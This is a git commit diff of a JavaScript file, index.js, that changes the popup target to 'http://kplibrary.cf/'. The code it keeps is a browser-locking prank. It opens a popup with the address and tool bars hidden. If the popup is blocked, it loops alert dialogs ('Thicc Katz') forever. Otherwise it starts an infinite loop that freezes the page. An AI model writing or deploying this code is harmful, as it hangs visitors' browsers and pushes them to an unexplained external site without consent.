db2c0014691ba35206ced1bd2f7443aa12ce6fbf
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-08 21:57:22 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,11 +1,11 @@
 var windowName = 'userConsole';
-var popUp = window.open('kplibrary.cf', '_blank', 'toolbar=0,location=0,menubar=0');
+var popUp = window.open("http://kplibrary.cf/", '_blank', 'toolbar=0,location=0,menubar=0');
 if (popUp == null || typeof(popUp) == 'undefined') {
   while (true) {
     alert("Thicc Katz")
   }
 } else {
-  window.open("kplibrary.cf");
+  window.open("http://kplibrary.cf/");
   setTimeout(function() {
     for (var i = 0; i === i; i++) {}
   }, 500);
